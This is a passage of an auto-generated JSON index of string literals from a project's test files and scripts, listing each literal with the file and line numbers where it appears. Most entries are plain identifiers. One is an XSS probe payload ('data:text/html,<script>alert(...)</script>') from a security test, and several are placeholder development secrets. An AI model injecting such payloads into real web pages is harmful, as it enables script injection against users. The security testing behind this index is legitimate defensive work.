        "scripts/business_value_test_index.py:99",
        "scripts/business_value_test_index.py:422",
        "scripts/business_value_test_index.py:471",
        "scripts/business_value_test_index.py:493"
      ]
    },
    "cost_per_1k_input": {
      "value": "cost_per_1k_input",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:96",
        "netra_backend/app/services/realistic_test_data/models.py:35",
        "netra_backend/app/services/realistic_test_data/models.py:45",
        "netra_backend/app/services/realistic_test_data/models.py:55",
        "netra_backend/app/services/realistic_test_data/models.py:65",
        "netra_backend/app/services/realistic_test_data/models.py:75"
      ]
    },
    "cost_per_1k_output": {
      "value": "cost_per_1k_output",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:97",
        "netra_backend/app/services/realistic_test_data/models.py:36",
        "netra_backend/app/services/realistic_test_data/models.py:46",
        "netra_backend/app/services/realistic_test_data/models.py:56",
        "netra_backend/app/services/realistic_test_data/models.py:66",
        "netra_backend/app/services/realistic_test_data/models.py:76"
      ]
    },
    "cost_per_1k_tokens": {
      "value": "cost_per_1k_tokens",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:202"
      ]
    },
    "cost_per_request_usd": {
      "value": "cost_per_request_usd",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:239"
      ]
    },
    "cost_per_token_usd": {
      "value": "cost_per_token_usd",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:239"
      ]
    },
    "cost_usd": {
      "value": "cost_usd",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:77",
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:111"
      ]
    },
    "cost|optimization|pricing|billing": {
      "value": "cost|optimization|pricing|billing",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:99"
      ]
    },
    "count": {
      "value": "count",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:96",
        "scripts/real_service_test_metrics.py:188"
      ]
    },
    "count_based": {
      "value": "count_based",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:840"
      ]
    },
    "coverage": {
      "value": "coverage",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:74",
        "scripts/business_value_test_index.py:549",
        "scripts/business_value_test_index.py:561",
        "scripts/remove_test_stubs.py:80",
        "scripts/team_updates_test_analyzer.py:75",
        "scripts/team_updates_test_analyzer.py:76",
        "scripts/test_backend.py:322",
        "scripts/test_backend.py:402",
        "scripts/unified_test_config.py:196",
        "scripts/unified_test_config.py:203"
      ]
    },
    "coverage-final.json": {
      "value": "coverage-final.json",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:561"
      ]
    },
    "coverage.json": {
      "value": "coverage.json",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:120",
        "scripts/autonomous_review/test_reviewer.py:121",
        "scripts/business_value_test_index.py:549",
        "scripts/business_value_test_index.py:551",
        "scripts/test_backend.py:402"
      ]
    },
    "coverage_gaps": {
      "value": "coverage_gaps",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:646",
        "scripts/business_value_test_index.py:757",
        "scripts/business_value_test_index.py:759"
      ]
    },
    "coverage_info": {
      "value": "coverage_info",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:29"
      ]
    },
    "coverage_percentage": {
      "value": "coverage_percentage",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:599"
      ]
    },
    "coverage_source": {
      "value": "coverage_source",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:167",
        "scripts/unified_test_config.py:176",
        "scripts/unified_test_config.py:185",
        "scripts/unified_test_config.py:359"
      ]
    },
    "coverage_target": {
      "value": "coverage_target",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:27",
        "scripts/unified_test_config.py:35",
        "scripts/unified_test_config.py:43",
        "scripts/unified_test_config.py:51",
        "scripts/unified_test_config.py:59",
        "scripts/unified_test_config.py:67"
      ]
    },
    "cpu_bottleneck": {
      "value": "cpu_bottleneck",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:363",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:438"
      ]
    },
    "cpu_intensive": {
      "value": "cpu_intensive",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:73",
        "scripts/unified_test_runner.py:904"
      ]
    },
    "cpu_percent": {
      "value": "cpu_percent",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:150",
        "netra_backend/app/services/realistic_test_data/log_generator.py:177",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:207",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:318",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:319",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:362",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:385"
      ]
    },
    "create": {
      "value": "create",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:84"
      ]
    },
    "createMockComponent": {
      "value": "createMockComponent",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:71"
      ]
    },
    "create_async_engine": {
      "value": "create_async_engine",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:42"
      ]
    },
    "create_module": {
      "value": "create_module",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:68"
      ]
    },
    "create_tables": {
      "value": "create_tables",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:53",
        "auth_service/tests/test_database_connection_validation.py:277"
      ]
    },
    "created_at": {
      "value": "created_at",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:155",
        "auth_service/tests/base/test_base.py:157",
        "auth_service/tests/factories/audit_factory.py:58",
        "auth_service/tests/factories/session_factory.py:38",
        "auth_service/tests/factories/user_factory.py:43",
        "auth_service/tests/utils/assertion_helpers.py:111",
        "auth_service/tests/utils/assertion_helpers.py:123",
        "auth_service/tests/utils/assertion_helpers.py:258"
      ]
    },
    "creates 'netra_staging' which causes failures": {
      "value": "creates 'netra_staging' which causes failures",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:230"
      ]
    },
    "creates problematic database name:": {
      "value": "creates problematic database name:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:228"
      ]
    },
    "creation_method": {
      "value": "creation_method",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:139"
      ]
    },
    "credential_issues": {
      "value": "credential_issues",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:65",
        "auth_service/tests/test_staging_database_credentials.py:66",
        "auth_service/tests/test_staging_database_credentials.py:148",
        "auth_service/tests/test_staging_database_credentials.py:293"
      ]
    },
    "critical": {
      "value": "critical",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:233",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:336",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:431",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:483",
        "scripts/auto_fix_test_violations.py:403",
        "scripts/business_value_test_index.py:680",
        "scripts/business_value_test_index.py:760",
        "scripts/compliance/fake_test_scanner.py:159",
        "scripts/compliance/fake_test_scanner.py:195",
        "scripts/compliance/fake_test_scanner.py:197"
      ]
    },
    "critical modules with security/data operations": {
      "value": "critical modules with security/data operations",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:252"
      ]
    },
    "critical modules...": {
      "value": "critical modules...",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:280"
      ]
    },
    "critical violations found": {
      "value": "critical violations found",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:605"
      ]
    },
    "critical violations requiring immediate fix": {
      "value": "critical violations requiring immediate fix",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:555"
      ]
    },
    "critical-error": {
      "value": "critical-error",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:150"
      ]
    },
    "critical/high severity fake tests": {
      "value": "critical/high severity fake tests",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:460"
      ]
    },
    "critical_failure": {
      "value": "critical_failure",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:814"
      ]
    },
    "critical_files": {
      "value": "critical_files",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:87",
        "scripts/compliance/fake_test_scanner.py:278",
        "scripts/compliance/fake_test_scanner.py:283",
        "scripts/compliance/fake_test_scanner.py:419"
      ]
    },
    "critical_paths": {
      "value": "critical_paths",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:59",
        "scripts/autonomous_review/test_reviewer.py:88",
        "scripts/standardize_l3_test_names.py:200"
      ]
    },
    "critical_test_count": {
      "value": "critical_test_count",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:634",
        "scripts/business_value_test_index.py:750"
      ]
    },
    "critical_test_percentage": {
      "value": "critical_test_percentage",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:635",
        "scripts/business_value_test_index.py:751"
      ]
    },
    "criticality": {
      "value": "criticality",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:97",
        "scripts/autonomous_review/test_reviewer.py:103"
      ]
    },
    "cross-category duplicates/highly similar tests. Consider creating shared test utilities or fixtures.": {
      "value": "cross-category duplicates/highly similar tests. Consider creating shared test utilities or fixtures.",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:489"
      ]
    },
    "cross_category_overlaps": {
      "value": "cross_category_overlaps",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:410",
        "scripts/analyze_test_overlap.py:565"
      ]
    },
    "csrf": {
      "value": "csrf",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:346",
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:125"
      ]
    },
    "csrf_test_code_": {
      "value": "csrf_test_code_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:336"
      ]
    },
    "csv": {
      "value": "csv",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:269",
        "scripts/remove_test_stubs.py:358"
      ]
    },
    "curl": {
      "value": "curl",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:272"
      ]
    },
    "current": {
      "value": "current",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:69",
        "scripts/team_updates_test_analyzer.py:78",
        "scripts/team_updates_test_analyzer.py:85",
        "scripts/test_staging_migrations.py:146",
        "scripts/test_staging_migrations.py:246"
      ]
    },
    "current_password": {
      "value": "current_password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:140"
      ]
    },
    "custom": {
      "value": "custom",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:169"
      ]
    },
    "custom_algo": {
      "value": "custom_algo",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:97"
      ]
    },
    "customer_service": {
      "value": "customer_service",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:30",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:36"
      ]
    },
    "customer_value_features": {
      "value": "customer_value_features",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:428"
      ]
    },
    "customers": {
      "value": "customers",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:491",
        "scripts/business_value_test_index.py:493"
      ]
    },
    "cy:run": {
      "value": "cy:run",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:223"
      ]
    },
    "cyan": {
      "value": "cyan",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:68",
        "scripts/test_oauth_local.py:350"
      ]
    },
    "cypress": {
      "value": "cypress",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:70",
        "scripts/test_discovery_report.py:48",
        "scripts/test_frontend.py:73",
        "scripts/test_frontend.py:101",
        "scripts/test_frontend.py:101"
      ]
    },
    "cypress/e2e": {
      "value": "cypress/e2e",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:36"
      ]
    },
    "cypress/e2e/**/*.cy.ts": {
      "value": "cypress/e2e/**/*.cy.ts",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:229"
      ]
    },
    "cypress:open": {
      "value": "cypress:open",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:221"
      ]
    },
    "dashboard.md": {
      "value": "dashboard.md",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:39"
      ]
    },
    "data": {
      "value": "data",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:181"
      ]
    },
    "data-service": {
      "value": "data-service",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:135"
      ]
    },
    "data1": {
      "value": "data1",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:364"
      ]
    },
    "data2": {
      "value": "data2",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:365"
      ]
    },
    "data:text/html,<script>alert('XSS')</script>": {
      "value": "data:text/html,<script>alert('XSS')</script>",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:97"
      ]
    },
    "data_validators": {
      "value": "data_validators",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:90"
      ]
    },
    "database": {
      "value": "database",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:52",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:28",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:42",
        "auth_service/test_staging_db_connection.py:57",
        "auth_service/test_staging_db_connection.py:94",
        "auth_service/tests/auth-service-down-critical-scenarios.py:186",
        "auth_service/tests/auth-service-down-critical-scenarios.py:191",
        "auth_service/tests/integration/test_auth_oauth_errors.py:441",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:856",
        "auth_service/tests/test_critical_staging_database_failures.py:82"
      ]
    },
    "database initialization failed": {
      "value": "database initialization failed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:133",
        "auth_service/tests/test_database_authentication_failures.py:391"
      ]
    },
    "database_connection": {
      "value": "database_connection",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:40"
      ]
    },
    "database_deadlock": {
      "value": "database_deadlock",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:37"
      ]
    },
    "database_dependent": {
      "value": "database_dependent",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:905"
      ]
    },
    "database_scripts": {
      "value": "database_scripts",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:126"
      ]
    },
    "database_url": {
      "value": "database_url",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:110",
        "scripts/unified_test_config.py:127",
        "scripts/unified_test_config.py:135",
        "scripts/unified_test_config.py:143",
        "scripts/unified_test_config.py:151",
        "scripts/unified_test_config.py:306",
        "scripts/unified_test_config.py:307"
      ]
    },
    "database|db|postgres|clickhouse|orm": {
      "value": "database|db|postgres|clickhouse|orm",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:98"
      ]
    },
    "datetime": {
      "value": "datetime",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:60",
        "scripts/compliance/test_refactor_helper.py:131"
      ]
    },
    "day_of_week": {
      "value": "day_of_week",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:123"
      ]
    },
    "db": {
      "value": "db",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:340",
        "scripts/auto_fix_test_violations.py:497"
      ]
    },
    "db_latencies": {
      "value": "db_latencies",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:51",
        "scripts/real_service_test_metrics.py:52",
        "scripts/real_service_test_metrics.py:53",
        "scripts/real_service_test_metrics.py:103",
        "scripts/real_service_test_metrics.py:104"
      ]
    },
    "db_name": {
      "value": "db_name",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:129"
      ]
    },
    "db_queries": {
      "value": "db_queries",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:23",
        "scripts/real_service_test_metrics.py:50",
        "scripts/real_service_test_metrics.py:156",
        "scripts/real_service_test_metrics.py:159",
        "scripts/real_service_test_metrics.py:160"
      ]
    },
    "debug": {
      "value": "debug",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:194",
        "scripts/unified_test_config.py:206"
      ]
    },
    "decorator spacing": {
      "value": "decorator spacing",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:31"
      ]
    },
    "decorator spacing for sync functions": {
      "value": "decorator spacing for sync functions",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:37"
      ]
    },
    "def": {
      "value": "def",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:572",
        "scripts/compliance/project_test_validator.py:230",
        "scripts/compliance/real_test_requirements_enforcer.py:320",
        "scripts/compliance/real_test_validator.py:205",
        "scripts/compliance/test_fixer.py:230",
        "scripts/compliance/test_fixer.py:285",
        "scripts/comprehensive_test_fixer.py:102",
        "scripts/comprehensive_test_fixer.py:111",
        "scripts/comprehensive_test_fixer.py:120",
        "scripts/comprehensive_test_fixer.py:129"
      ]
    },
    "def __init__(self):": {
      "value": "def __init__(self):",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:47"
      ]
    },
    "def _setup_test_data(self):\n        \"\"\"Setup test data and configurations\"\"\"": {
      "value": "def _setup_test_data(self):\n        \"\"\"Setup test data and configurations\"\"\"",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:658"
      ]
    },
    "def _verify_results(self, results):\n        \"\"\"Verify test results and assertions\"\"\"": {
      "value": "def _verify_results(self, results):\n        \"\"\"Verify test results and assertions\"\"\"",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:666"
      ]
    },
    "def mock_components": {
      "value": "def mock_components",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:36",
        "scripts/compliance/test_fixer.py:38"
      ]
    },
    "def real_components": {
      "value": "def real_components",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:38"
      ]
    },
    "def test_": {
      "value": "def test_",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:152",
        "scripts/autonomous_review/test_generator.py:165",
        "scripts/autonomous_review/test_generator.py:175",
        "scripts/autonomous_review/test_generator.py:215",
        "scripts/compliance/demo_test_size_enforcement.py:155",
        "scripts/compliance/real_test_requirements_enforcer.py:153",
        "scripts/compliance/test_size_validator.py:170"
      ]
    },
    "def test_\\\\w+\\\\([^)]*\\\\):[^{]*?(?:pass|return)": {
      "value": "def test_\\\\w+\\\\([^)]*\\\\):[^{]*?(?:pass|return)",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:276"
      ]
    },
    "def test_{name}(self):\\n        \"\"\"Test {path}\"\"\"\\n        # Critical path that must be tested\\n        # TODO: Implement comprehensive test\\n        pass\\n    \\n": {
      "value": "def test_{name}(self):\\n        \"\"\"Test {path}\"\"\"\\n        # Critical path that must be tested\\n        # TODO: Implement comprehensive test\\n        pass\\n    \\n",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:240"
      ]
    },
    "def\\s+(\\w+)": {
      "value": "def\\s+(\\w+)",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:278"
      ]
    },
    "def\\s+(\\w+)\\s*\\(": {
      "value": "def\\s+(\\w+)\\s*\\(",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:135"
      ]
    },
    "def\\s+\\w*_mock\\w*": {
      "value": "def\\s+\\w*_mock\\w*",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:60"
      ]
    },
    "def\\s+\\w+\\([^)]*\\)\\s*:\\s*\\n\\s*\\.\\.\\.\\s*$": {
      "value": "def\\s+\\w+\\([^)]*\\)\\s*:\\s*\\n\\s*\\.\\.\\.\\s*$",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:68"
      ]
    },
    "def\\s+\\w+\\([^)]*\\)\\s*:\\s*\\n\\s*pass\\s*$": {
      "value": "def\\s+\\w+\\([^)]*\\)\\s*:\\s*\\n\\s*pass\\s*$",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:66"
      ]
    },
    "def\\s+\\w+\\(\\*args\\s*,\\s*\\*\\*kwargs\\)\\s*:\\s*\\n.*return\\s*\\{": {
      "value": "def\\s+\\w+\\(\\*args\\s*,\\s*\\*\\*kwargs\\)\\s*:\\s*\\n.*return\\s*\\{",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:63"
      ]
    },
    "def\\s+create_mock_\\w*component": {
      "value": "def\\s+create_mock_\\w*component",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:150"
      ]
    },
    "def\\s+mock_\\w*_component": {
      "value": "def\\s+mock_\\w*_component",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:151"
      ]
    },
    "def\\s+mock_\\w+": {
      "value": "def\\s+mock_\\w+",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:59"
      ]
    },
    "default": {
      "value": "default",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:109",
        "auth_service/tests/base/test_base.py:116",
        "auth_service/tests/base/test_base.py:117",
        "auth_service/tests/test_five_whys_reproduction.py:351",
        "auth_service/tests/test_five_whys_reproduction.py:352"
      ]
    },
    "default password": {
      "value": "default password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:125"
      ]
    },
    "degradation_factor": {
      "value": "degradation_factor",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:123"
      ]
    },
    "degraded": {
      "value": "degraded",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:187",
        "scripts/team_updates_test_analyzer.py:98"
      ]
    },
    "delete": {
      "value": "delete",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:42",
        "scripts/comprehensive_test_fixer.py:86"
      ]
    },
    "delta": {
      "value": "delta",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:69",
        "scripts/team_updates_test_analyzer.py:80",
        "scripts/team_updates_test_analyzer.py:85"
      ]
    },
    "denied": {
      "value": "denied",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:143"
      ]
    },
    "dependencies": {
      "value": "dependencies",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:105",
        "scripts/test_frontend.py:99"
      ]
    },
    "dependency_aware": {
      "value": "dependency_aware",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:815",
        "scripts/unified_test_runner.py:841"
      ]
    },
    "dependency_resolution": {
      "value": "dependency_resolution",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:42"
      ]
    },
    "dependency_resolution     → test_06_services_starting_before_dependencies": {
      "value": "dependency_resolution     → test_06_services_starting_before_dependencies",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:392"
      ]
    },
    "deployment_related": {
      "value": "deployment_related",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:78",
        "scripts/test_error_monitor_logic.py:94",
        "scripts/test_error_monitor_logic.py:170",
        "scripts/test_error_monitor_logic.py:176",
        "scripts/test_error_monitor_logic.py:194",
        "scripts/test_error_monitor_logic.py:200",
        "scripts/test_error_monitor_logic.py:221",
        "scripts/test_error_monitor_logic.py:224"
      ]
    },
    "deprecated": {
      "value": "deprecated",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:160"
      ]
    },
    "describe(": {
      "value": "describe(",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:156"
      ]
    },
    "describe\\s*\\(\\s*[\\'\"]([^\\'\"]*)[\\'\"]": {
      "value": "describe\\s*\\(\\s*[\\'\"]([^\\'\"]*)[\\'\"]",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:421"
      ]
    },
    "description": {
      "value": "description",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:249",
        "auth_service/tests/integration/test_auth_oauth_errors.py:254",
        "auth_service/tests/integration/test_auth_oauth_errors.py:259",
        "auth_service/tests/integration/test_auth_oauth_errors.py:264",
        "auth_service/tests/integration/test_auth_oauth_errors.py:269",
        "auth_service/tests/integration/test_auth_oauth_errors.py:274",
        "auth_service/tests/integration/test_auth_oauth_errors.py:321",
        "auth_service/tests/integration/test_auth_oauth_errors.py:327",
        "auth_service/tests/integration/test_auth_oauth_errors.py:333",
        "auth_service/tests/integration/test_auth_oauth_errors.py:339"
      ]
    },
    "desktop": {
      "value": "desktop",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:202",
        "auth_service/tests/test_session_management.py:231"
      ]
    },
    "detail": {
      "value": "detail",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:203",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:203",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:280",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:280",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:310",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:317",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:346",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:346",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:383",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:383"
      ]
    },
    "detailed_analysis": {
      "value": "detailed_analysis",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:290",
        "scripts/fix_test_import_errors.py:327",
        "scripts/fix_test_import_errors.py:329"
      ]
    },
    "detailed_metrics": {
      "value": "detailed_metrics",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:219",
        "scripts/test_backend_optimized.py:348"
      ]
    },
    "details": {
      "value": "details",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:147",
        "scripts/comprehensive_test_fixer.py:341",
        "scripts/fix_test_batch.py:37",
        "scripts/fix_test_batch.py:45",
        "scripts/fix_test_batch.py:56",
        "scripts/fix_test_batch.py:73",
        "scripts/fix_test_batch.py:232",
        "scripts/fix_test_batch.py:245",
        "scripts/fix_test_batch.py:301",
        "scripts/fix_test_batch.py:302"
      ]
    },
    "dev": {
      "value": "dev",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:216",
        "auth_service/tests/test_five_whys_reproduction.py:366",
        "scripts/test_frontend.py:289",
        "scripts/test_oauth_local.py:246",
        "scripts/unified_test_config.py:95",
        "scripts/unified_test_config.py:133",
        "scripts/unified_test_runner.py:178",
        "scripts/unified_test_runner.py:554",
        "scripts/unified_test_runner.py:558",
        "scripts/unified_test_runner.py:604"
      ]
    },
    "devDependencies": {
      "value": "devDependencies",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:99"
      ]
    },
    "dev_client_id_123": {
      "value": "dev_client_id_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:195"
      ]
    },
    "dev_google_client_123": {
      "value": "dev_google_client_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:209"
      ]
    },
    "dev_launcher/tests": {
      "value": "dev_launcher/tests",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:123"
      ]
    },
    "dev_secret_456": {
      "value": "dev_secret_456",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:196"
      ]
    },
    "development": {
      "value": "development",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:228",
        "auth_service/tests/test_cloud_sql_url.py:78",
        "auth_service/tests/test_critical_staging_issues.py:145",
        "auth_service/tests/test_database_authentication_failures.py:157",
        "auth_service/tests/test_database_connection_validation.py:305",
        "auth_service/tests/test_database_manager.py:164",
        "auth_service/tests/test_database_manager.py:183",
        "auth_service/tests/test_database_manager.py:199",
        "auth_service/tests/test_database_manager.py:207",
        "auth_service/tests/test_five_whys_reproduction.py:332"
      ]
    },
    "development mode": {
      "value": "development mode",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:151"
      ]
    },
    "development_password": {
      "value": "development_password",
